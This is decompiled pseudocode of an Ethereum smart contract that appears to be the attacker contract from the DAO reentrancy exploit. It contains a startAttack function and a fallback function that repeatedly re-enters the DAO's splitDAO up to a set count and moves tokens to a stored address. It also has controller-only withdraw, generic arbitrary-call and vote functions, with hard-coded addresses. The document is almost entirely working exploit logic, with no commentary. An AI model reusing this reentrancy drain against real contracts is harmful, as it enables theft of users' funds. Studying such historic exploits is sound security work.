contract main {


// =======================  Init code  ======================


address stor0; offset 24
address stor2;
uint256 stor5;
uint256 stor6;
uint256 stor10;
bool stor11; offset 256
address stor11;

function _fallback() payable {
    stor5 = 30
    stor6 = 100
    stor10 = 0
    stor0 = 0xbb9bc244d798123fde783fcc1c72d3bb8c189413
    address(stor11.field_0) = 0xbb9bc244d798123fde783fcc1c72d3bb8c189413
    stor11.field_256 % 1 = 0
    stor2 = 0x13c7c27ea7ee89ec6607965b6f357b0109bc98b4
    return code.data[151 len 3259]
}



// =====================  Runtime code  =====================


uint8 stor0;
uint8 stor0; offset 8
uint8 stor0; offset 16
uint16 stor0;
uint256 stor0; offset 24
uint256 stor0; offset 16
uint256 stor0;
array of uint256 stor1;
address stor2;
uint256 stor2;
address stor3;
uint256 stor4;
uint256 stor5;
uint256 stor6;
uint8 stor7;
uint128 stor7; offset 168
address stor7; offset 8
uint256 stor7; offset 8
uint256 stor7;
uint256 stor8;
array of uint256 stor9;
uint256 stor10;
bool stor11; offset 256
address stor11;

function changePercent(uint256 arg1) payable {
    require address(stor2) == msg.sender
    stor6 = arg1
}

function sub_3052c493(?) payable {
    require address(stor2) == msg.sender
    stor10 = 0
    stor5 = arg1
}

function sub_c2147c58(?) payable {
    require address(stor2) == msg.sender
    Mask(240, 0, stor0.field_16) = Mask(240, 0, arg1)
}

function changeController(address arg1) payable {
    require address(stor2) == msg.sender
    uint256(stor2) = arg1 or Mask(96, 160, uint256(stor2))
}

function sub_47174efb(?) payable {
    require address(stor2) == msg.sender
    uint256(stor0.field_0) = arg1 or Mask(248, 8, uint256(stor0.field_0))
}

function withdraw() payable {
    require address(stor2) == msg.sender
    call address(stor2) with:
       value eth.balance(this.address) wei
         gas 0 wei
}

function changeDAO(address arg1) payable {
    require address(stor2) == msg.sender
    Mask(232, 0, stor0.field_24) = Mask(232, 0, arg1)
    address(stor11.field_0) = arg1
    stor11.field_256 % 1 = 0
}

function sub_0911e24d(?) payable {
    require address(stor2) == msg.sender
    uint256(stor0.field_0) = arg1 or Mask(248, 8, uint256(stor0.field_0))
    stor4 = arg2
    stor1.length = arg3 or Mask(96, 160, stor1.length)
}

function vote(uint256 arg1, bool arg2) payable {
    require address(stor2) == msg.sender
    call address(stor11.field_0).0xc9d27afe with:
         gas gas_remaining - 25050 wei
        args arg1, arg2
    require ext_call.success
}

function sub_016b94b4(?) payable {
    require address(stor2) == msg.sender
    call address(stor11.field_0).splitDAO(uint256 rg1, address rg2) with:
         gas arg1 wei
        args stor4, address(stor1.length)
    require ext_call.success
}

function transfer(address arg1, uint256 arg2) payable {
    require address(stor2) == msg.sender
    call address(stor11.field_0).0xa9059cbb with:
         gas gas_remaining - 25050 wei
        args address(arg1), arg2
    require ext_call.success
}

function startAttack() payable {
    require address(stor2) == msg.sender
    call address(stor11.field_0).splitDAO(uint256 rg1, address rg2) with:
         gas gas_remaining - 25050 wei
        args stor4, address(stor1.length)
    require ext_call.success
}

function sub_528f0dfd(?) payable {
    require address(stor2) == msg.sender
    uint16(stor0.field_0) = arg1
    Mask(240, 0, stor0.field_16) = Mask(240, 0, arg2)
    Mask(232, 0, stor0.field_24) = Mask(232, 24, arg1) >> 24
    uint256(stor7.field_0) = arg3 or Mask(248, 8, uint256(stor7.field_0))
}

function sub_73837c83(?) payable {
    mem[128 len arg1.length] = arg1[all]
    require msg.sender == address(stor2)
    mem[ceil32(arg1.length) + 128 len arg1.length] = arg1[all]
    if not arg1.length % 32:
        call address(stor11.field_0) with:
             gas arg2 wei
            args arg1[all]
    else:
        mem[floor32(arg1.length) + ceil32(arg1.length) + 128] = mem[floor32(arg1.length) + ceil32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
        call address(stor11.field_0).mem[ceil32(arg1.length) + 128 len 4] with:
             gas arg2 wei
            args mem[ceil32(arg1.length) + 132 len floor32(arg1.length) + 28]
}

function sub_2825b231(?) payable {
    mem[128 len arg1.length] = arg1[all]
    require msg.sender == address(stor2)
    mem[ceil32(arg1.length) + 128 len arg1.length] = arg1[all]
    if not arg1.length % 32:
        call address(stor11.field_0) with:
             gas gas_remaining - 25050 wei
            args arg1[all]
    else:
        mem[floor32(arg1.length) + ceil32(arg1.length) + 128] = mem[floor32(arg1.length) + ceil32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
        call address(stor11.field_0).mem[ceil32(arg1.length) + 128 len 4] with:
             gas gas_remaining - 25050 wei
            args mem[ceil32(arg1.length) + 132 len floor32(arg1.length) + 28]
}

function sub_77a8a219(?) payable {
    mem[128 len arg1.length] = arg1[all]
    require msg.sender == address(stor2)
    mem[ceil32(arg1.length) + 128 len arg1.length] = arg1[all]
    if not arg1.length % 32:
        call address(stor11.field_0) with:
           value arg3 wei
             gas arg2 wei
            args arg1[all]
    else:
        mem[floor32(arg1.length) + ceil32(arg1.length) + 128] = mem[floor32(arg1.length) + ceil32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
        call address(stor11.field_0).mem[ceil32(arg1.length) + 128 len 4] with:
           value arg3 wei
             gas arg2 wei
            args mem[ceil32(arg1.length) + 132 len floor32(arg1.length) + 28]
}

function sub_5353c11d(?) payable {
    mem[128 len arg1.length] = arg1[all]
    require msg.sender == address(stor2)
    mem[ceil32(arg1.length) + 128 len arg1.length] = arg1[all]
    if not arg1.length % 32:
        call address(stor11.field_0) with:
           value arg2 wei
             gas gas_remaining - 34050 wei
            args arg1[all]
    else:
        mem[floor32(arg1.length) + ceil32(arg1.length) + 128] = mem[floor32(arg1.length) + ceil32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
        call address(stor11.field_0).mem[ceil32(arg1.length) + 128 len 4] with:
           value arg2 wei
             gas gas_remaining - 34050 wei
            args mem[ceil32(arg1.length) + 132 len floor32(arg1.length) + 28]
}

function sub_a2c0da8d(?) payable {
    mem[128 len arg4.length] = arg4[all]
    require msg.sender == address(stor2)
    uint8(stor7.field_0) = arg1
    Mask(248, 0, stor7.field_8) = Mask(248, 0, arg2)
    Mask(88, 0, stor7.field_168) = Mask(88, 168, arg1) >> 168
    stor8 = arg3
    stor9.length = (2 * arg4.length) + 1
    s = 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c7af
    idx = 128
    while arg4.length + 128 > idx:
        stor[s] = mem[idx]
        s = s + 1
        idx = idx + 32
        continue 
    idx = (Mask(251, 0, arg4.length + 31) >> 5) + 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c7af
    while (stor9.length + 31 / 32) + 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c7af > idx:
        stor[idx] = 0
        idx = idx + 1
        continue 
}

function _fallback() payable {
    if uint8(stor0.field_0):
        mem[100] = this.address
        call address(stor11.field_0).0x70a08231 with:
             gas gas_remaining - 25050 wei
            args this.address
        require ext_call.success
        if stor10 < stor5:
            stor10++
            if not uint8(stor0.field_16):
                mem[100] = stor4
                mem[132] = address(stor1.length)
                call address(stor11.field_0).splitDAO(uint256 rg1, address rg2) with:
                     gas gas_remaining - 25050 wei
                    args stor4, address(stor1.length)
                require ext_call.success
            else:
                call address(stor11.field_0).0xa9059cbb with:
                     gas gas_remaining - 25050 wei
                    args stor3, ext_call.return_data[0] * stor6 / 100
                require ext_call.success
                mem[100] = stor4
                mem[132] = address(stor1.length)
                call address(stor11.field_0).splitDAO(uint256 rg1, address rg2) with:
                     gas gas_remaining - 25050 wei
                    args stor4, address(stor1.length)
        stor10 = 0
        if uint8(stor0.field_8):
            mem[100] = stor3
            mem[132] = ext_call.return_data[0]
            call address(stor11.field_0).0xa9059cbb with:
                 gas gas_remaining - 25050 wei
                args stor3, ext_call.return_data[0]
            require ext_call.success
    if uint8(stor7.field_0):
        mem[96] = stor9
        idx = 96
        s = 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c7af
        while stor9.length + 96 > idx + 32:
            mem[idx + 32] = uint256(stor1[s])
            idx = idx + 32
            s = s + 1
            continue 
        call address(stor7.field_8).mem[96 len 4] with:
           value stor8 wei
             gas gas_remaining - 34050 wei
            args mem[100 len stor9.length + (floor32(stor9.length - 1) + -stor9.length + 32 % 32) - 4]
}



}
